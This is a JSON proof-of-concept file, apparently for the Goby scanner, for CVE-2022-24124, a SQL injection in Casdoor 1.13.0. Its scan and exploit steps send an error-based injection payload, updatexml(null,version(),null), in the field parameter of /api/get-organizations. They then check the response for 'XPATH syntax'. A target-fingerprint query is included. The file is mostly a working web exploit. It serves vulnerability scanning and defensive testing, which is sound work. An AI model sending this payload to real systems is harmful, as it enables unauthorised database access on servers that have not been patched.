{
      "Name": "Casdoor 1.13.0 SQL Injection（CVE-2022-24124）",
      "Level": "3",
      "Tags": [
            "sqli"
      ],
      "GobyQuery": "app=\"Beego-Server\"",
      "Description": "The query API in Casdoor before 1.13.1 has a SQL injection vulnerability related to the field and value parameters, as demonstrated by api/get-organizations.",
      "Product": "Casdoor 1.13.0",
      "Homepage": "https://gobies.org/",
      "Author": "gobysec@gmail.com",
      "Impact": "",
      "Recommendation": "",
      "References": [
            "https://gobies.org/"
      ],
      "HasExp": true,
      "ExpParams": null,
      "ExpTips": {
            "Type": "",
            "Content": ""
      },
      "ScanSteps": [
            "AND",
            {
                  "Request": {
                        "method": "GET",
                        "uri": "/api/get-organizations?p=123&pageSize=123&value=cfx&sortField=&sortOrder=&field=updatexml(null,version(),null)",
                        "follow_redirect": true,
                        "header": {
                              "User-Agent": "Mozilla/5.0(X11; Linux x86_64; rv:12.0) Gecko/20100101 Firefox/12.0"
                        },
                        "data_type": "text",
                        "data": "",
                        "set_variable": []
                  },
                  "ResponseTest": {
                        "type": "group",
                        "operation": "AND",
                        "checks": [
                              {
                                    "type": "item",
                                    "variable": "$code",
                                    "operation": "==",
                                    "value": "200",
                                    "bz": ""
                              },
                              {
                                    "type": "item",
                                    "variable": "$body",
                                    "operation": "contains",
                                    "value": "XPATH syntax",
                                    "bz": ""
                              }
                        ]
                  },
                  "SetVariable": [
                        "output|lastbody|regex|"
                  ]
            }
      ],
      "ExploitSteps": [
            "AND",
            {
                  "Request": {
                        "method": "GET",
                        "uri": "/api/get-organizations?p=123&pageSize=123&value=cfx&sortField=&sortOrder=&field=updatexml(null,version(),null)",
                        "follow_redirect": true,
                        "header": null,
                        "data_type": "text",
                        "data": "",
                        "set_variable": []
                  },
                  "ResponseTest": {
                        "type": "group",
                        "operation": "AND",
                        "checks": [
                              {
                                    "type": "item",
                                    "variable": "$code",
                                    "operation": "==",
                                    "value": "200",
                                    "bz": ""
                              },
                              {
                                    "type": "item",
                                    "variable": "$body",
                                    "operation": "contains",
                                    "value": "XPATH syntax",
                                    "bz": ""
                              }
                        ]
                  },
                  "SetVariable": [
                        "output|lastbody|regex|"
                  ]
            }
      ],
      "PostTime": "2022-05-26 00:03:25",
      "GobyVersion": "1.9.325"
}